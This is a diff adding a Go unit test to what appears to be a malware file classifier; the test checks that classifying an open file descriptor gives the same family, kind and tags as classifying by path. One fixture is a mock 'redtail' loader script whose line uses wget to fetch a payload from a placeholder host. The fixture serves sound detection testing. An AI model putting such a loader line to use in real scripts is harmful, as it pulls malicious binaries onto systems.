@@ -329,6 +329,46 @@ func TestClassifyLargeELFKeepsArchAndStatic(t *testing.T) {
 	}
 }
 
+// ClassifyFile is what a pinned caller (the campaign worker) uses: it must
+// give Classify's answer for the same bytes, parse a >256 KiB ELF from the
+// open descriptor (elf.NewFile, not a path re-open), and not depend on the
+// file's current offset.
+func TestClassifyFileMatchesClassify(t *testing.T) {
+	dir := t.TempDir()
+	cases := map[string][]byte{
+		"big-static": largeStaticELF64(elf.EM_X86_64),
+		"redtail.sh": []byte("#!/bin/bash\n# redtail loader\nwget http://x/redtail.x86_64\n"),
+	}
+	for name, raw := range cases {
+		p := filepath.Join(dir, name)
+		if err := os.WriteFile(p, raw, 0o600); err != nil {
+			t.Fatal(err)
+		}
+		want, err := Classify(p)
+		if err != nil {
+			t.Fatal(err)
+		}
+		f, err := os.Open(p)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if _, err := f.Seek(17, 0); err != nil { // offset must not matter
+			t.Fatal(err)
+		}
+		got, err := ClassifyFile(f)
+		f.Close()
+		if err != nil {
+			t.Fatal(err)
+		}
+		if got.Family != want.Family || got.FileKind != want.FileKind || strings.Join(got.Tags, ",") != strings.Join(want.Tags, ",") {
+			t.Fatalf("%s: ClassifyFile %+v, Classify %+v", name, got, want)
+		}
+	}
+	if c, _ := Classify(filepath.Join(dir, "big-static")); !containsTag(c.Tags, "static") || !containsTag(c.Tags, "x86-64") {
+		t.Fatalf("large ELF lost structural tags: %v", c.Tags)
+	}
+}
+
 // TestFirstLineHandlesEmpty makes sure firstLine() doesn't panic on
 // odd inputs (the classifier shells out to it on every script).
 func TestFirstLineHandlesEmpty(t *testing.T) {
